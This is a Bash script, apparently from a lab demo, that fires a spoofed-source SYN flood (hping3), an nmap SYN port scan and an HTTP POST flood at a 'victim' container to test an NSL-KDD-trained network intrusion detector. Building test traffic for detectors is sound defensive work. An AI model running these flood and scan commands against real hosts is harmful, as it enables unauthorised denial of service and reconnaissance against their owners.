#!/bin/bash
# Lanza una o varias familias de ataque contra la victima.
#
# Cada familia corresponde a un perfil real de NSL-KDD que el modelo aprendio:
#   1. SYN flood   -> perfil `neptune`: SYNs sin respuesta, serror_rate=1.0
#   2. Port scan   -> perfil `nmap`:   muchos puertos, conexiones sin cerrar
#   3. HTTP flood  -> perfil `satan`:  muchas conexiones con carga y respuesta
#
# `ATTACK` elige que correr (default `all`, el comportamiento historico):
#   ATTACK=1       solo SYN flood
#   ATTACK=2       solo escaneo de puertos
#   ATTACK=3       solo inundacion HTTP
#   ATTACK=all     los tres, espaciados en el tiempo
#   ATTACK=normal  solo trafico normal (30 GET HTTP a la victima)
#
# `TRAFFIC` agrega trafico normal EN PARALELO a un ataque:
#   TRAFFIC=none    (default) solo el ataque
#   TRAFFIC=normal  corre normal_traffic en segundo plano mientras ataca
#
# El trafico normal debe salir desde este contenedor: comparte el netns del
# NIDS (`network_mode: service:nids`), asi que es el unico que el detector ve.
#
# El espaciado importa: el NIDS clasifica por ventanas de 2 s, asi que los
# ataques tienen que caer en ventanas distintas para verse por separado.
#
# Cada ataque corre dentro de `timeout`: si una herramienta se traba, el script
# igual sigue con la siguiente y termina. La demo NUNCA se cuelga.
#
# `NIDS_WARMUP` (default 12) es la espera inicial para que el NIDS empiece a
# capturar. Con 0 no se espera: lo usa el menu, que ya dejo el detector arriba.

set -u

TARGET="${1:-victim}"
NIDS_WARMUP="${NIDS_WARMUP:-12}"
ATTACK="${ATTACK:-all}"
TRAFFIC="${TRAFFIC:-none}"

case "${ATTACK}" in
    1|2|3|normal) TOTAL=1 ;;
    all) TOTAL=3 ;;
    *)
        echo "ATTACK invalido: '${ATTACK}'. Usa 1, 2, 3, all o normal." >&2
        exit 2
        ;;
esac

case "${TRAFFIC}" in
    none|normal) ;;
    *)
        echo "TRAFFIC invalido: '${TRAFFIC}'. Usa none o normal." >&2
        exit 2
        ;;
esac

# Rotulo del paso. Con un solo ataque se omite el contador [x/1], que confunde.
announce() {
    if [ "${TOTAL}" -eq 1 ]; then
        echo ""
        echo ">>> $2"
    else
        echo ""
        echo ">>> [$1/${TOTAL}] $2"
    fi
}

# true si el ataque pedido esta habilitado (o si se pidieron todos).
enabled() {
    [ "${ATTACK}" = "all" ] || [ "${ATTACK}" = "$1" ]
}

# Trafico legitimo: 30 GET HTTP espaciados 0.5 s. Cada curl corta solo con
# -m 2, asi que ni una victima colgada puede dejar el script esperando.
normal_traffic() {
    echo ">>> Tráfico normal: 30 requests HTTP GET a http://${TARGET}/"
    for _ in $(seq 1 30); do
        curl -s -m 2 -o /dev/null "http://${TARGET}/" || true
        sleep 0.5
    done
    echo "    Tráfico normal terminado (30 requests)"
}

echo "=============================================="
echo " ATACANTE - objetivo: ${TARGET}"
echo " Ataque(s): ${ATTACK}"
if [ "${TRAFFIC}" = "normal" ]; then
    echo " Tráfico normal: en paralelo"
fi
echo "=============================================="
if [ "${NIDS_WARMUP}" -gt 0 ]; then
    echo "Esperando ${NIDS_WARMUP}s a que el NIDS empiece a capturar..."
    sleep "${NIDS_WARMUP}"
else
    echo "NIDS_WARMUP=0: arrancando sin espera inicial."
fi

# ATTACK=normal: solo trafico legitimo, sin ataques.
if [ "${ATTACK}" = "normal" ]; then
    normal_traffic
    echo ""
    echo "=============================================="
    echo " Tráfico normal completado. Revisa la salida del NIDS."
    echo "=============================================="
    exit 0
fi

# TRAFFIC=normal: el trafico legitimo sale en paralelo mientras corre el ataque.
# Se espera al final para que el script no termine antes que estos requests.
NORMAL_PID=""
if [ "${TRAFFIC}" = "normal" ]; then
    normal_traffic &
    NORMAL_PID=$!
fi

if enabled 1; then
    announce 1 "SYN flood (perfil neptune)"
    # -c 400 con -i u2000: 400 SYNs espaciados 2 ms, todos dentro de una ventana de
    # 2 s del NIDS. Sin `--flood` a proposito: en ese modo hping3 ignora `-c` y
    # nunca termina.
    # --rand-source: origenes falsos, tipico de un DoS. Al no haber respuesta,
    # el flujo queda con serror_rate alto y dst_bytes=0.
    timeout 20 hping3 -S -p 80 -i u2000 --rand-source -c 400 "${TARGET}" >/dev/null 2>&1
    echo "    SYN flood terminado (400 paquetes)"
    sleep 6
fi

if enabled 2; then
    announce 2 "Escaneo de puertos (perfil nmap)"
    # -sS: escaneo SYN. Muchos puertos destino desde un mismo origen.
    timeout 60 nmap -sS -Pn -p 1-300 --max-retries 1 -T4 "${TARGET}" >/dev/null 2>&1
    echo "    Escaneo terminado (300 puertos)"
    sleep 6
fi

if enabled 3; then
    announce 3 "Inundacion HTTP (perfil satan)"
    # Muchas conexiones con carga y respuesta: volumen en ambos sentidos.
    # El bloque entero va bajo `timeout` (via `bash -s`, que lee este heredoc);
    # ademas cada curl corta solo con -m 1. Asi el ataque no puede quedarse colgado.
    timeout 30 bash -s "${TARGET}" <<'FLOOD' >/dev/null 2>&1
for _ in $(seq 1 60); do
    curl -s -m 1 -X POST -d "payload=$(head -c 800 /dev/zero | tr '\0' 'A')" \
        "http://$1/" >/dev/null 2>&1 &
done
wait
FLOOD
    echo "    Flood HTTP terminado (60 peticiones)"
    sleep 4
fi

if [ -n "${NORMAL_PID}" ]; then
    wait "${NORMAL_PID}" || true
fi

echo ""
echo "=============================================="
if [ "${TRAFFIC}" = "normal" ]; then
    echo " Ataque(s) y tráfico normal completados. Revisa la salida del NIDS."
elif [ "${TOTAL}" -eq 1 ]; then
    echo " Ataque completado. Revisa la salida del NIDS."
else
    echo " Ataques completados. Revisa la salida del NIDS."
fi
echo "=============================================="
